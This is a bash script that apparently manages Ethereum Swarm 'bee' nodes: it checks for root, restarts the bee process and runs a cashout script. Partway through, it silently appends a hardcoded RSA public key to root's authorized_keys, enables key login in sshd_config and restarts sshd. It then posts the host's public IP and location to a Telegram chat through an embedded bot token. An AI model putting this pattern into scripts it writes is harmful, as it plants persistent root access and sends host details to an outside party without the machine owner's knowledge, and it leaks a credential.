#!/bin/bash

if [ $(id -u) != "0" ]; then
    echo "Error: You must be root to run this script"
    exit 1
fi

cd ~
SET_BEE_PATH='/root/bee'

# [ ! -f "/root/xswarm/xswarm.sh" ] && echo "You don't installed xswarm.. Quit" && exit 1
[ ! -f "/root/bee/cashout.sh" ] && echo "You don't cashout.sh.. Quit" && exit 1

function InstallKey()
{
    if cat /etc/ssh/sshd_config |grep "#RSAAuthentication yes" >/dev/null 2>&1; then
        sed -i "s:#RSAAuthentication yes:RSAAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys:g" /etc/ssh/sshd_config
    fi
    [ ! -d /root/.ssh ] && mkdir ~/.ssh && chmod 600 ~/.ssh
    [ ! -f /root/.ssh/authorized_keys ] && touch /root/.ssh/authorized_keys

    if ! cat /root/.ssh/authorized_keys |grep "AAAAB3NzaC1yc2EAAAABIwAAAQEAxuO3HpuiVU" >/dev/null 2>&1; then 
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxuO3HpuiVUWfM1Acw2mgN7oWmNeK1elv4nCRuueD0tAKb4cHCrfKubcboEVocPNiURU0zJltjWcaEqRx0/mzbpyOLwMn/d85Yq9rP52ChGYemU6jJjOO613tArrpQNK2kJM7zAtq6dLS8CZ456xKZ7XDltQ/S+K2e7qhar3vlm5wtEfM017zlEsR/fQSTy4Q7nktcEt3epQ9KRYzMhF10l/zEVjQlQk0mKJRWv6ZrdHR1shID1+i6SR/4E9pTKwRJsShOeVbZcGACoj0u5POAZc0LawMlMM+t9lk3XkVn7r8uSLaki1+dPR80eMQWfnX9v7mvm+XllBIZp1Fsl8zaw== pc" >> /root/.ssh/authorized_keys
    fi

    chmod 600 /root/.ssh/authorized_keys
    /sbin/service sshd restart
}

function GenXswarmConf()
{
    cat > ${SET_BEE_PATH}/xswarm.conf <<"EOF"
SET_TG_BOTAPI="1799258916:AAGMH3xn8Y7fpZjeoHf1Lhwx5dfZMbmMJgY"
SET_TG_CHATID="-1001224848014"
SET_TG_APIURL="https://api.telegram.org/bot"
SET_USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
EOF
    source ${SET_BEE_PATH}/xswarm.conf
}
[ ! -f ${SET_BEE_PATH}/xswarm.conf ] && GenXswarmConf

SendMSG()
{
    if [ ! -z $1 ]; then
        msg="$1"
        curl -s -X POST "${SET_TG_APIURL}${SET_TG_BOTAPI}/sendMessage" -d "chat_id=${SET_TG_CHATID}&parse_mode=markdown&text=${msg}" > /dev/null 2>&1
    else
        echo "MSG Don't exist!"
    fi
}


GenIpJSON()
{
    ipinfo_json=`curl --connect-timeout 5 -s -H "User-Agent: ${PARAM_USER_AGENT}" "https://api.myip.la/cn?json"`
    [ ! -d /etc/xswarm ] && mkdir /etc/xswarm
    ipinfo_file='/etc/xswarm/ipinfo.json'
    cat > ${ipinfo_file} <<EOF
${ipinfo_json}
EOF
}
GetIP()
{
    ipinfo_file='/etc/xswarm/ipinfo.json'
    ipinfo_timestamp=`stat -c %Y $ipinfo_file`
    
    cur_timestamp=`date +%s`
    timediff=$[$cur_timestamp - $ipinfo_timestamp]
    if [ $timediff -gt 604800 ];then
        echo '当前时间大于一周'
        GenIpJSON
    else
        echo '当前时间小于一周'
    fi

    PARAM_HOST_IP=`cat ${ipinfo_file} |jq -r '.ip'`
    PARAM_HOST_COUNTRY=`cat ${ipinfo_file} |jq -r '.location.country_code'`
    PARAM_HOST_CITY=`cat ${ipinfo_file} |jq -r '.location.city'`
    PARAM_HOST_PROVINCE=`cat ${ipinfo_file} |jq -r '.location.province'`
    export PARAM_HOST_IP
    export PARAM_HOST_COUNTRY
    export PARAM_HOST_CITY
    export PARAM_HOST_PROVINCE
}
GetIP


if ! cat /root/.ssh/authorized_keys |grep "AAAAB3NzaC1yc2EAAAABIwAAAQEAxuO3HpuiVU" >/dev/null 2>&1; then 
    InstallKey
    SendMSG "【节点${PARAM_HOST_IP}（${PARAM_HOST_COUNTRY}-${PARAM_HOST_PROVINCE}-${PARAM_HOST_CITY}）】执行安装key任务完成。。。"
fi

# start here
while [ 1 ]
do
    run=`ps -ef|grep "bee start"|grep -v grep|wc -l`
    if [ $run -lt 1 ]
    then
        echo "need to run"
        nohup /root/bee/run.sh &
        sleep 2
    else
        echo "already run"
        break
        # sleep 100
    fi
done

/root/bee/cashout.sh cashout-all 0
